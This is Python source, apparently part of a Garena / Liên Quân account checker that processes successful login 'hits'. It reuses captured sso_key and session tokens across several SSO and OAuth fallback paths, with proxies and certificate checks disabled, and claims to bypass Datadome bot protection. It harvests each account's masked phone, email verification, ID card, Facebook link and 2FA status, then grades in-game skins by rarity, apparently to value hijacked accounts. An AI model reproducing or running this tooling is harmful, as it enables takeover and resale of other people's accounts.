        if v not in (None, "", 0, "0", False):
            fb_on = True
            break
    info["fb_connected"] = fb_on
    info["fb_account"] = fa or (ui.get("fb_account") or "")
    if isinstance(info["fb_account"], str):
        info["fb_account"] = info["fb_account"].strip()
    info["acc_country"] = ui.get("acc_country") or ""
    info["country"] = ui.get("country") or ""
    info["country_code"] = ui.get("country_code") or ""
    return info


def _result_security_snapshot(r: dict) -> dict:
    """Map result HIT -> dict kiểu account/init để kiểm tra đủ dữ liệu."""
    if not isinstance(r, dict):
        return {}
    return {
        "masked_phone": r.get("masked_phone"),
        "masked_email": r.get("masked_email"),
        "idcard": r.get("idcard"),
        "fb_connected": r.get("fb_linked"),
        "fb_account": r.get("fb_account_name"),
        "authenticator_enable": r.get("authenticator_enable"),
        "two_step_verify": r.get("two_step_verify"),
        **({"email_v": r["email_v"]} if "email_v" in r else {}),
    }


def _result_has_security_data(r: dict) -> bool:
    return _security_snapshot_nonempty(_result_security_snapshot(r))


def _account_init_from_session(sess, ua: str, proxy=None) -> dict:
    """Gọi account/init trên session đã có cookie SSO."""
    proxies = _get_http_proxies(proxy)
    init_headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://account.garena.com/vi",
        "Origin": "https://account.garena.com",
        "X-Requested-With": "XMLHttpRequest",
    }
    best = {}
    init_paths = ("https://account.garena.com/api/account/init",)
    if not (_fetch_lean or _QUIET_BULK):
        init_paths = (
            "https://account.garena.com/api/account/init",
            "https://account.garena.com/api/account/init?locale=vi-VN",
        )
    for path in init_paths:
        try:
            resp = sess.get(
                path,
                headers=init_headers,
                verify=False,
                timeout=15,
                proxies=proxies,
            )
            if resp.status_code != 200:
                continue
            data = resp.json()
            if not isinstance(data, dict) or data.get("error"):
                continue
            parsed = _parse_account_init_payload(data)
            if _security_snapshot_nonempty(parsed):
                return parsed
            if parsed and not best:
                best = parsed
        except Exception:
            continue
    return best


def _sso_follow_redirect(sess, resp, ua: str, proxy=None) -> None:
    """Theo redirect SSO (302) để nhận cookie account.garena.com."""
    proxies = _get_http_proxies(proxy)
    loc = (resp.headers.get("Location") or resp.headers.get("location") or "").strip()
    if not loc:
        try:
            body = resp.json()
            if isinstance(body, dict):
                loc = (
                    body.get("redirect_uri")
                    or body.get("redirect_url")
                    or body.get("location")
                    or ""
                )
                loc = str(loc).strip()
        except Exception:
            pass
    if not loc:
        return
    if loc.startswith("/"):
        base = "https://account.garena.com"
        if "sso.garena" in (getattr(resp, "url", "") or ""):
            base = "https://sso.garena.com"
        loc = base + loc
    elif loc.startswith("//"):
        loc = "https:" + loc
    try:
        sess.get(
            loc,
            headers={"User-Agent": ua},
            verify=False,
            timeout=15,
            allow_redirects=True,
            proxies=proxies,
        )
    except Exception:
        pass


def _fetch_account_security_session(
    sso_key: str, proxy=None, session_token: str = ""
) -> dict:
    """SSO + account/init. Chế độ lean: 1 lần cookie+init, fallback 1 lần SSO (ít login history)."""
    if not HAS_REQUESTS or not sso_key:
        return {}
    ua = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    )
    proxies = _get_http_proxies(proxy)
    merged = {}
    lean = _fetch_lean or _QUIET_BULK

    def _prime_sso_cookies(sess) -> None:
        for domain in (".garena.com", "account.garena.com", "sso.garena.com"):
            try:
                sess.cookies.set("sso_key", sso_key, domain=domain)
            except Exception:
                pass

    # Lean: cookie + account/init trực tiếp (không qua 5 vòng SSO/authgop)
    if lean:
        try:
            init_headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Cookie": f"sso_key={sso_key}",
                "Referer": "https://account.garena.com/vi",
            }
            tok = (session_token or "").strip()
            if tok:
                init_headers["Cookie"] += f"; session_token={tok}"
            resp = _requests.get(
                "https://account.garena.com/api/account/init",
                headers=init_headers,
                verify=False,
                timeout=12,
                proxies=proxies,
            )
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and "error" not in data:
                    parsed = _parse_account_init_payload(data)
                    if _security_snapshot_nonempty(parsed):
                        return parsed
                    merged = _merge_security_snapshots(merged, parsed)
        except Exception:
            pass
        if _security_snapshot_nonempty(merged):
            return merged
        try:
            sess = _requests.Session()
            if proxy:
                sess.proxies = proxies
            _prime_sso_cookies(sess)
            resp = sess.get(
                "https://sso.garena.com/api/universal/login",
                headers={"User-Agent": ua},
                params={
                    "app_id": "10100",
                    "sso_key": sso_key,
                    "redirect_uri": "https://account.garena.com/",
                },
                verify=False,
                timeout=12,
                allow_redirects=True,
            )
            try:
                for c in resp.cookies:
                    sess.cookies.set_cookie(c)
            except Exception:
                pass
            parsed = _account_init_from_session(sess, ua, proxy)
            merged = _merge_security_snapshots(merged, parsed)
            if _security_snapshot_nonempty(merged):
                return merged
        except Exception:
            pass
        return merged

    # Cách 1: universal/login — chấp nhận 200 và 302
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = proxies
        _prime_sso_cookies(sess)
        resp = sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False,
            timeout=15,
            allow_redirects=False,
        )
        try:
            for c in resp.cookies:
                sess.cookies.set_cookie(c)
        except Exception:
            pass
        if resp.status_code in (301, 302, 303, 307, 308):
            _sso_follow_redirect(sess, resp, ua, proxy)
        elif resp.status_code == 200:
            _sso_follow_redirect(sess, resp, ua, proxy)
        parsed = _account_init_from_session(sess, ua, proxy)
        merged = _merge_security_snapshots(merged, parsed)
        if _security_snapshot_nonempty(merged):
            return merged
    except Exception:
        pass

    # Cách 2: allow_redirects=True
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = proxies
        _prime_sso_cookies(sess)
        sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False,
            timeout=15,
            allow_redirects=True,
        )
        parsed = _account_init_from_session(sess, ua, proxy)
        merged = _merge_security_snapshots(merged, parsed)
        if _security_snapshot_nonempty(merged):
            return merged
    except Exception:
        pass

    # Cách 3: mở account.garena.com/?sso_key=
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = proxies
        _prime_sso_cookies(sess)
        sess.get(
            "https://account.garena.com/",
            params={"sso_key": sso_key},
            headers={"User-Agent": ua},
            verify=False,
            timeout=15,
            allow_redirects=True,
        )
        parsed = _account_init_from_session(sess, ua, proxy)
        merged = _merge_security_snapshots(merged, parsed)
        if _security_snapshot_nonempty(merged):
            return merged
    except Exception:
        pass

    # Cách 4: authgop grant (client 10100) rồi init
    try:
        import time as _t

        sess = _requests.Session()
        if proxy:
            sess.proxies = proxies
        _prime_sso_cookies(sess)
        sess.post(
            "https://authgop.garena.com/oauth/token/grant",
            headers={
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
            },
            data=(
                "client_id=10100&response_type=token"
                "&redirect_uri=https%3A%2F%2Faccount.garena.com%2F"
                f"&format=json&id={int(_t.time() * 1000)}"
            ),
            verify=False,
            timeout=12,
        )
        parsed = _account_init_from_session(sess, ua, proxy)
        merged = _merge_security_snapshots(merged, parsed)
        if _security_snapshot_nonempty(merged):
            return merged
    except Exception:
        pass

    # Cách 5: Cookie header thủ công + init
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = proxies
        init_headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Cookie": f"sso_key={sso_key}",
            "Referer": "https://account.garena.com/vi",
        }
        if session_token:
            init_headers["Cookie"] += f"; session_token={session_token}"
        resp = sess.get(
            "https://account.garena.com/api/account/init",
            headers=init_headers,
            verify=False,
            timeout=15,
            proxies=proxies,
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict) and "error" not in data:
                merged = _merge_security_snapshots(
                    merged, _parse_account_init_payload(data)
                )
    except Exception:
        pass

    return merged


def _security_snapshot_nonempty(sec: dict) -> bool:
    if not sec:
        return False
    if "email_v" in sec:
        return True
    if bool(sec.get("fb_connected")) or str(sec.get("fb_account") or "").strip():
        return True
    for k in ("masked_phone", "masked_email", "idcard"):
        if str(sec.get(k) or "").strip().replace("*", ""):
            return True
    if sec.get("authenticator_enable") or sec.get("two_step_verify"):
        return True
    return False


def _fetch_account_security(
    sso_key: str, proxy=None, session_token: str = ""
) -> dict:
    """Fetch account.garena.com via SSO; lean/bulk không retry nhiều vòng.
    Cached per sso_key for 10 minutes to avoid repeated HTTP calls."""
    # ── Check cache ──
    cache_key = f"{sso_key}:{session_token}" if session_token else sso_key
    now = time.time()
    with _acct_sec_cache_lock:
        cached = _acct_sec_cache.get(cache_key)
        if cached and (now - cached[1]) < _ACCT_SEC_CACHE_TTL:
            return cached[0]

    def _store_cache(result):
        """Cache helper — lưu trước mọi return."""
        with _acct_sec_cache_lock:
            _acct_sec_cache[cache_key] = (result, time.time())

    tok = (session_token or "").strip()
    merged = _fetch_account_security_session(sso_key, proxy, tok)
    if _security_snapshot_nonempty(merged):
        _store_cache(merged)
        return merged
    if _fetch_lean or _QUIET_BULK:
        _store_cache(merged)
        return merged
    import time as _t

    for delay in (0.2, 0.35):
        _t.sleep(delay)
        nxt = _fetch_account_security_session(sso_key, proxy, tok)
        merged = _merge_security_snapshots(merged, nxt)
        if _security_snapshot_nonempty(merged):
            break

    _store_cache(merged)
    return merged


def _fetch_connect_prefill_via_sso(
    sso_key: str,
    app_id: int = LIEN_QUAN_APP_ID,
    region: str = "VN",
    proxy=None,
) -> str:
    """Lấy prefill_mobile qua OAuth grant + connect (bổ sung khi account/init thiếu SĐT)."""
    if not HAS_REQUESTS or not sso_key:
        return ""
    try:
        cid = str(app_id)
        base = f"https://{cid}.connect.garena.com"
        grant_post = (
            f"client_id={cid}&response_type=token&redirect_uri=gop{cid}%3A%2F%2F"
            f"&login_scenario=normal&format=json&id={int(time.time() * 1000)}"
        )
        grant_headers = {
            "User-Agent": _AOV_MOBILE_UA,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
            "Origin": base,
            "Referer": f"{base}/universal/oauth?locale=vi-VN&platform=1&response_type=token"
            f"&login_scenario=normal&client_id={cid}&redirect_uri=gop{cid}%3A%2F%2F",
            "Cookie": f"sso_key={sso_key}",
        }
        grant_resp = _requests.post(
            f"{base}/oauth/token/grant",
            data=grant_post,
            headers=grant_headers,
            timeout=10,
            verify=False,
            proxies=_get_http_proxies(proxy),
        )
        access_token = (grant_resp.json() or {}).get("access_token", "")
        if not access_token:
            return ""
        ui_resp = _requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params={
                "app_id": cid,
                "region": region or "VN",
                "access_token": access_token,
            },
            headers={
                "User-Agent": _AOV_MOBILE_UA,
                "Accept": "application/json, text/plain, */*",
            },
            timeout=10,
            verify=False,
            proxies=_get_http_proxies(proxy),
        )
        if ui_resp.status_code == 200:
            return str((ui_resp.json() or {}).get("data", {}).get("prefill_mobile") or "").strip()
    except Exception:
        pass
    return ""


def _apply_acct_sec_to_result(result: dict, acct_sec: dict) -> None:
    """Gộp snapshot account.garena vào result HIT."""
    if not acct_sec or not isinstance(result, dict):
        return
    if acct_sec.get("_http_success"):
        result["_http_success"] = True
    if acct_sec.get("masked_phone"):
        result["masked_phone"] = acct_sec.get("masked_phone", "")
        result["mobile_bound"] = True
    if acct_sec.get("masked_email"):
        result["masked_email"] = acct_sec.get("masked_email", "")
    if acct_sec.get("email_status"):
        result["email_status"] = str(acct_sec.get("email_status") or "").strip()
    if "email_v" in acct_sec:
        result["email_v"] = acct_sec["email_v"]
        result["email_verified"] = _truthy_email_v(acct_sec["email_v"])
    elif acct_sec.get("email_verified") or _user_info_says_email_verified(acct_sec):
        result["email_verified"] = True
    else:
        st = str(acct_sec.get("email_status") or result.get("email_status") or "").strip().lower()
        if st in {"verified", "confirmed", "done", "success"}:
            result["email_verified"] = True
        elif st in {"unverified", "pending", "inactive", "none", "false", "0"}:
            result["email_verified"] = False
    if acct_sec.get("idcard"):
        result["idcard"] = acct_sec.get("idcard", "")
    if "authenticator_enable" in acct_sec:
        result["authenticator_enable"] = acct_sec.get("authenticator_enable", 0)
    if "two_step_verify" in acct_sec:
        result["two_step_verify"] = acct_sec.get("two_step_verify", 0)
    if acct_sec.get("country_code"):
        result["country_code"] = str(acct_sec.get("country_code", "")).strip()
    if acct_sec.get("acc_country"):
        result["acc_country"] = str(acct_sec.get("acc_country", "")).strip()
    if acct_sec.get("country"):
        result["account_init_country"] = str(acct_sec.get("country", "")).strip()
    fb_http = bool(acct_sec.get("fb_connected"))
    _fa = acct_sec.get("fb_account")
    if isinstance(_fa, str) and _fa.strip():
        fb_http = True
    if fb_http:
        result["fb_linked"] = True
    if acct_sec.get("fb_account"):
        result["fb_account_name"] = acct_sec["fb_account"]


def _extract_phone_from_nested(data) -> str:
    """Tìm SĐT (kể cả che) trong payload connect / account/init lồng nhau."""
    if not isinstance(data, dict):
        return ""

    def _walk(obj, depth: int = 0) -> str:
        if depth > 8:
            return ""
        if isinstance(obj, dict):
            for k in (
                "prefill_mobile",
                "masked_phone",
                "mobile_no",
                "mobile",
                "phone",
                "bind_phone",
            ):
                v = str(obj.get(k) or "").strip()
                if v and re.search(r"\d", v.replace("*", "")):
                    return v
            for v in obj.values():
                got = _walk(v, depth + 1)
                if got:
                    return got
        elif isinstance(obj, list):
            for item in obj:
                got = _walk(item, depth + 1)
                if got:
                    return got
        return ""

    return _walk(data)


def _apply_phone_to_result(result: dict, phone: str) -> None:
    ph = (phone or "").strip()
    if not ph or not re.search(r"\d", ph.replace("*", "")):
        return
    if not (result.get("masked_phone") or "").strip():
        result["masked_phone"] = ph
    if not (result.get("aov_prefill_mobile") or "").strip():
        result["aov_prefill_mobile"] = ph
    result["mobile_bound"] = True
    mcc = re.match(r"^\+(\d{1,3})\b", ph)
    if mcc and not (result.get("country_code") or "").strip():
        result["country_code"] = mcc.group(1)


def _refill_security_bindings(
    result: dict,
    sock,
    session_key: bytes,
    aov_token: str = "",
    proxy=None,
) -> None:
    """Bổ sung SĐT/FB/2FA — không gọi lại account/init nếu đã có snapshot."""
    if not isinstance(result, dict):
        return
    sso_key = (result.get("sso_key") or "").strip()
    session_token = (result.get("session_token") or "").strip()
    reg = _partition_region_for_aov(result)

    _sec_proxy = proxy
    lean = _fetch_lean or _QUIET_BULK
    acct_ok = bool(result.get("_acct_sec_ok"))

    if sock and session_key and not _hit_fb_linked_from_sources(result):
        fb_tries = 1 if lean else 3
        for _ in range(fb_tries):
            try:
                fb = _fetch_fb_info(
                    sock, session_key, max_rounds=2 if lean else 3
                )
                if fb.get("fb_linked"):
                    result["fb_linked"] = True
                if fb.get("fb_uid"):
                    result["fb_uid"] = fb.get("fb_uid")
                if _hit_fb_linked_from_sources(result):
                    break
            except Exception:
                pass

    if sso_key and not acct_ok and not (
        lean and _result_has_security_data(result)
    ):
        sec = _fetch_account_security(
            sso_key, proxy=_sec_proxy, session_token=session_token
        )
        _apply_acct_sec_to_result(result, sec)
        if _security_snapshot_nonempty(sec):
            result["_acct_sec_ok"] = True

    if not _has_any_phone(result) and aov_token and HAS_REQUESTS:
        ai = result.get("aov_user_info")
        if not isinstance(ai, dict) or not ai:
            ai = _fetch_aov_user_info(aov_token, reg, proxy) or {}
            if isinstance(ai, dict) and ai:
                result["aov_user_info"] = ai
        if isinstance(ai, dict) and ai:
            pm = _extract_phone_from_nested(ai)
            if pm:
                _apply_phone_to_result(result, pm)

    if (
        not lean
        and not _has_any_phone(result)
        and sso_key
    ):
        pm2 = _fetch_connect_prefill_via_sso(
            sso_key, LIEN_QUAN_APP_ID, reg, _sec_proxy
        )
        if pm2:
            _apply_phone_to_result(result, pm2)

    if (
        not lean
        and sock
        and session_key
        and not _hit_fb_linked_from_sources(result)
    ):
        try:
            fb2 = _fetch_fb_info(sock, session_key, max_rounds=3)
            if fb2.get("fb_linked"):
                result["fb_linked"] = True
        except Exception:
            pass

def _mcc_from_result(result: dict) -> str:
    """Mã quốc gia từ country_code API hoặc SĐT (+84, +66, ...)."""
    for src in _hit_security_sources(result) if isinstance(result, dict) else []:
        if not isinstance(src, dict):
            continue
        cc = str(src.get("country_code") or "").strip()
        if cc.isdigit():
            return cc
    cc = str((result or {}).get("country_code") or "").strip()
    if cc.isdigit():
        return cc
    for ph_key in ("masked_phone", "aov_prefill_mobile"):
        mp = (str((result or {}).get(ph_key) or "")).strip()
        m = re.match(r"^\+(\d{1,3})\b", mp)
        if m:
            return m.group(1)
    return ""


def _api_country_raw_candidates(result: dict) -> list:
    """
    Mã quốc gia từ API (không dùng region CMD 276 / email / suy rank VN).
    Thứ tự: UAC shop → acc_country → account/init country → MCC SĐT (account/init).
    """
    if not isinstance(result, dict):
        return []
    out = []
    for key in ("uac_country", "acc_country", "account_init_country"):
        v = (result.get(key) or "").strip()
        if _country_token_usable(v):
            out.append(v)
    mcc = _mcc_from_result(result)
    if mcc and mcc not in out:
        out.append(mcc)
    cc = str((result.get("country_code") or "")).strip()
    if cc.isdigit() and cc not in out:
        out.append(cc)
    return out


def _country_from_api_fields(result: dict) -> str:
    """Chuẩn hóa quốc gia chỉ từ field API đã có trong result."""
    for raw in _api_country_raw_candidates(result):
        n = _normalize_country(str(raw).strip().upper())
        if n and n not in ("UNKNOWN", "ZZ"):
            return "VIET NAM" if n == "VIETNAM" else n
    return "UNKNOWN"


def _ensure_uac_country(result: dict, sso_key: str, proxy=None) -> None:
    """Gọi shop UAC nếu chưa có — nguồn quốc gia chính thức Garena."""
    if not isinstance(result, dict) or not sso_key or not HAS_REQUESTS:
        return
    if (result.get("uac_country") or "").strip():
        return
    uac = _fetch_uac_country_cached(sso_key, proxy)
    if uac and _country_token_usable(uac):
        result["uac_country"] = uac.strip().upper()


def _partition_region_for_aov(result: dict) -> str:
    """
    Mã partition gọi API LQ shop/weekly — từ UAC/acc_country/MCC API.
    Không dùng region CMD 276. Mặc định VN chỉ khi API không trả gì.
    """
    for raw in _api_country_raw_candidates(result):
        s = str(raw).strip().upper()
        if len(s) == 2 and s.isalpha() and _country_token_usable(s):
            return s
        n = _normalize_country(s)
        if n and n != "UNKNOWN":
            _iso = {
                "VIET NAM": "VN", "VIETNAM": "VN", "VIỆT NAM": "VN",
                "THAILAND": "TH", "PHILIPPINES": "PH", "INDONESIA": "ID",
                "MALAYSIA": "MY", "SINGAPORE": "SG", "TAIWAN": "TW",
            }
            if n in _iso:
                return _iso[n]
    return "VN"


def _resolve_account_country(
    result: dict, sso_key: str = "", proxy=None
) -> str:
    """
    Quốc gia tài khoản — chỉ từ API (account/init, UAC shop, MCC SĐT).
    KHÔNG dùng region CMD 276, email, rank suy đoán.
    """
    if not isinstance(result, dict):
        return "UNKNOWN"
    mcc = _mcc_from_result(result)
    if mcc and not (result.get("country_code") or "").strip():
        result["country_code"] = mcc
    _ensure_uac_country(result, sso_key, proxy)
    resolved = _country_from_api_fields(result)
    if resolved in ("UNKNOWN", "ZZ") and sso_key and HAS_REQUESTS:
        _ensure_uac_country(result, sso_key, proxy)
        resolved = _country_from_api_fields(result)
    if resolved == "VIETNAM":
        resolved = "VIET NAM"
    result["country"] = resolved
    return resolved


def _country_label_hit(h: dict) -> str:
    """Nhãn Quốc Gia trên dòng HIT — chỉ từ API đã resolve, không gán VN từ region."""
    c = (h.get("country") or "").strip()
    if not c or c.upper() in ("UNKNOWN", "ZZ"):
        c = _country_from_api_fields(h)
    if not c or c.upper() in ("UNKNOWN", "ZZ"):
        return "UNKNOWN"
    if c.upper() in ("VIETNAM", "VIET NAM", "VIỆT NAM"):
        return "VIET NAM"
    return c


def _country_file_key(h: dict) -> str:
    """Tên file country/*.txt và acc_trang_* /VIETNAM.txt."""
    c = _normalize_country((h.get("country") or "").strip()) or "UNKNOWN"
    if c in ("VIET NAM", "VIỆT NAM"):
        c = "VIETNAM"
    return re.sub(r"[^A-Z0-9_ -]+", "", c).strip().replace(" ", "_") or "UNKNOWN"


def _fetch_uac_country(sso_key: str, proxy=None) -> str:
    """Fetch UAC country code from shop.garena.sg using sso_key, bypassing Datadome block."""
    if not HAS_REQUESTS or not sso_key:
        return ""
    try:
        import time
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.cookies.set('sso_key', sso_key)
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        token_resp = sess.post(token_url, headers=token_headers, data=token_data, timeout=10, verify=False)
        access_token = token_resp.json().get('access_token')
        if access_token:
            inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
            inspect_resp = sess.post(inspect_url, json={'token': access_token}, timeout=10, verify=False)
            uac = inspect_resp.json().get('uac')
            if uac:
                return str(uac).strip().upper()
    except Exception:
        pass
    return ""

# ── UAC Country Cache ───────────────────────────────────────────────────────
_uac_cache: dict = {}  # sso_key -> (country, timestamp)
_uac_cache_lock = __import__('threading').Lock()
_UAC_CACHE_TTL = 300.0  # 5 minutes

def _fetch_uac_country_cached(sso_key: str, proxy=None) -> str:
    """Cached version of _fetch_uac_country — giảm HTTP calls trong lean mode."""
    if not sso_key:
        return ""
    now = time.time()
    with _uac_cache_lock:
        cached = _uac_cache.get(sso_key)
        if cached and (now - cached[1]) < _UAC_CACHE_TTL:
            return cached[0]
    result = _fetch_uac_country(sso_key, proxy)
    with _uac_cache_lock:
        _uac_cache[sso_key] = (result, now)
    return result

# ── Liên Quân skin ID classification ─────────────────────────────────────────
SKIN_SS = {
    '10603': 'Krixi Tiệc bãi biển', '10705': 'Zephys Siêu việt',
    '10714': 'Zephys Kỷ Nguyên Hổ Phách', '10801': 'Gildur Tiệc bãi biển',
    '10915': 'Veera Thất Sát', '10912': 'Veera A.I love you',
    '11105': 'Violet Tiệc bãi biển', '11110': 'Violet Vợ người ta',
    '11113': 'Violet Huyết ma thần', '11115': 'Violet Thần Long tỷ tỷ',
    '11202': 'Yorn Thế tử nguyệt tộc', '11205': 'Yorn Long thần soái',
    '11212': 'Yorn Vệ Binh ngân hà', '11604': 'Nữ quái nổi loạn',
    '11614': 'Butterfly Kim Ngư thần nữ', '11616': 'Butterfly Nữ thần Khởi nguyên',
    '11619': 'Butterfly Rockgirl Siêu Đẳng', '11808': 'Alice Quân nhạc Athanor',
    '12008': 'Mina Linh xà Yêu vũ', '12304': 'Maloch Đại tướng Robot',
    '12606': 'Arduin Bạch vệ chiến giáp', '12608': 'Arduin Ngạo Hổ Hàn Đao',
    '12801': 'Lữ Bố Tiệc bãi biển', '12806': 'Lữ Bố Tư lệnh Robot',
    '12812': 'Lữ Bố Cửu Thiên Lôi Thần', '12907': 'Triệu Vân Kỵ sĩ tận thế',
    '12913': 'Triệu Vân Chiến Thần Vô Song', '13005': 'Airi Kiemono',
    '13006': 'Airi Bạch Kiemono', '13104': 'Murad Siêu việt',
    '13108': 'Murad Siêu việt 2.0', '13109': 'Murad Chí tôn thần kiếm',
    '13204': 'Hayate Tử thần vũ trụ', '13212': 'Hayate Thống soái Dạ Ưng',
    '13302': 'Valhein Vũ khí tối thượng', '13313': 'Valhein Đệ nhất thần thám',
    '13609': 'Ilumia Khải Huyền Thiên Hậu', '13612': 'Ilumia Nộ hải Thiên ngư',
    '13705': 'Paine Tử xà bá tước', '14104': 'Lauriel Thánh quang sứ',
    '14107': 'Lauriel Tinh vân sứ', '14109': 'Lauriel Thiên sứ công nghệ',
    '14110': 'Lauriel Phi Thiên', '14117': 'Lauriel Vũ khúc miêu ảnh',
    '14118': 'Lauriel Thiên nữ Dạ Ưng', '14207': 'Natalya Băng tâm thần nữ',
    '14213': 'Natalya Nguyệt Ảnh Kiếm Tiên', '14206': 'Natalya Nghiệp hỏa yêu hậu',
    '14404': 'Taara Tiệc bãi biển', '15007': 'Nakroth Lôi quang sứ',
    '15202': 'Điêu Thuyền Tiệc bãi biển', '15211': 'Điêu Thuyền Thất Tịch tiên tử',
    '15216': 'Điêu Thuyền Tuế Hàn Đỗ Quyên', '15413': 'Yena Trấn Yêu Thần Lộc',
    '15409': 'Yena WaVe', '15204': 'Điêu Thuyền WaVe', '15611': 'Aleister HLV bất bại',
    '15704': 'Raz Chiến thần Muay Thái', '15705': 'Raz Siêu việt',
    '16304': 'Ryoma Samurai huyền thoại', '16607': 'Arthur Siêu việt',
    '16703': 'Ngộ Không Siêu việt', '16710': 'Ngộ Không Tân niên Võ thần',
    '16711': 'Ngộ Không Thần Giáp Xích Diễm', '16712': 'Ngộ Không Tề Thiên Võ Thánh',
    '16705': 'Ngộ Không Siêu việt 2.0', '17106': 'Cresht Bách tướng Lão tam',
    '17309': 'Fennik Phong tranh thám xuân', '17408': 'Stuart Siêu Trùm phản diện',
    '18408': 'Helen Bé hoa xuân', '18702': 'Arum Vũ khúc long hổ',
    '18704': "Arum Vũ khúc thần sứ", '19002': "Tulen Tân thần thiên hà",
    '19006': 'Tulen Tân thần hoàng kim', '19012': 'Tulen Tân niên vệ thần',
    '19013': 'Tulen Tiêu Dao Vũ Thần', '19109': 'Rouie Lữ hành Thời không',
    '19509': 'Enzo Sát thần Bạch Hổ', '19605': 'Elsu Sứ giả tận thế',
    '19609': 'Elsu Trấn Thiên phi hồ', '19603': 'Elsu Guitar tình ái',
    '20601': 'Charlotte Hexsword', '50111': 'TelAnnas Vũ khúc yêu hồ',
    '50117': 'TelAnnas Thiên Vũ Thần Long', '50604': 'Omen Đao phủ tận thế',
    '50613': 'Omen Liệt Hỏa Thiên Cang', '51003': 'Liliana Nguyệt mị ly',
    '51005': 'Liliana Tân nguyệt mị ly', '51004': 'Liliana Tiểu thơ anh đào',
    '51009': 'Liliana WaVe', '51013': 'Liliana Lưu thủy Thần long',
    '51208': 'Rourke Bách tướng Lão đại', '51306': 'Zata Chí tôn Tà phượng',
    '51504': 'Richter Thần kiếm Susanoo', '51802': 'Quillen Đặc công mãng xà',
    '51808': 'Quillen Nghịch Thiên long đế', '52007': 'Veres Kimono',
    '52113': 'Florentino Kỷ Nguyên Hổ Phách', '52404': 'Capheny Kimono',
    '52709': 'Sephera Bách nhạn Ngân linh', '52710': 'Sephera Nova Stardust',
    '52908': 'Volkath Ma ảnh thần đao', '53304': 'Laville Xạ thần Tinh Vệ',
    '53309': 'Laville Vệ binh Giáng sinh', '53503': 'Sinestrea WaVe',
    '53703': 'Allain Tuyết sơn song kiếm', '54507': 'Yue Hỗn Độn Thần Ma',
    '54802': 'Bijan Hoàng Kim cơ giáp', '54805': 'Bijan Lữ Hành Thời Không',
    '56703': 'Erin Tình yêu cổ tích', '56704': 'Erin Huyễn Ảnh Mị Điệp',
    '59802': 'Bolt Baron Thiên Phủ', '59901': 'Billow Thiên Tướng - Độ Ách',
    '10618': 'Krixi Kimono', '15905': 'Dolia Mã Khởi Thiên Ca',
    '59902': 'Billow T-Rex Bất Bại', '59801': 'Bolt Baron Lôi vệ',
}

SKIN_SSS = {
    '10620': 'Krixi Phù thủy thời không', '11107': 'Violet Thứ nguyên vệ thần',
    '11119': 'Violet Vọng nguyệt Long Cơ', '11607': 'Butterfly Phượng Cửu Thiên',
    '12912': 'Triệu Vân Minh Chung Long Đế', '13011': 'Airi Bích hải thánh nữ',
    '13015': 'Airi Thứ nguyên Vệ thần', '13116': 'Murad Tuyệt thế thần binh',
    '13118': 'Murad Thiên Luân Kiếm Thánh', '13210': 'Hayate Tu Di thánh đế',
    '13314': 'Valhein Thứ nguyên vệ thần', '13613': 'Ilumia Lưỡng Nghi Long Hậu',
    '14111': 'Lauriel Thứ nguyên vệ thần', '15009': 'Nakroth Thứ nguyên vệ thần',
    '15013': 'Nakroth Quỷ thương Liệp đế', '15015': 'Nakroth Bạch Diện chiến thương',
    '15217': 'Điêu Thuyền Nhật Nguyệt Thánh Linh', '15412': 'Yena Huyền Cửu Thiên',
    '15710': 'Raz Bão vũ Cuồng lôi', '19007': "Tulen Chí tôn kiếm tiên",
    '19009': "Tulen Thần sứ STL-79", '19908': "Elando'rr Mộng Giới Thần Chủ",
    '50105': "TelAnnas Thần sứ F.E.E-X1", '50108': 'TelAnnas Thứ nguyên vệ thần',
    '50112': 'TelAnnas Tân niên vệ thần', '50119': 'TelAnnas Lân Quang Thánh Điệu',
    '51015': 'Liliana Ma Pháp Tối Thượng', '52011': 'Veres Lưu Ly Long Mẫu',
    '52414': 'Capheny Càn Nguyên Điện Chủ', '54307': 'Aya Công chúa Cầu Vồng',
    '54804': 'Bijan Kình thiên Long Kỵ',
}

SKIN_ANIME = {
    '10611': 'Krixi Terrible Tornado', '11120': 'Violet Nobara Kugisaki',
    '11215': 'Yorn Conan Edogawa', '11610': 'Butterfly Asuna Tia Chớp',
    '11611': 'Butterfly Stacia', '11812': 'Alice - Eternal Sailor Chibi Moon',
    '11810': 'Alice Phi hành gia', '13111': 'Murad Byakuya Kuchiki',
    '13112': 'Murad Zenitsu Agatsuma', '13213': 'Hayate Siêu đạo chích Kid',
    '13706': 'Paine Megumi Fushiguro', '14214': 'Natalya Kuromis Heart anime',
    '15012': 'Nakroth Killua', '15212': 'Điêu Thuyền Eternal Sailor Moon',
    '15711': 'Raz Gon', '15707': 'Raz Saitama Cosplay',
    '16307': 'Ryoma Ultraman', '16311': 'Ryoma Maple Frost',
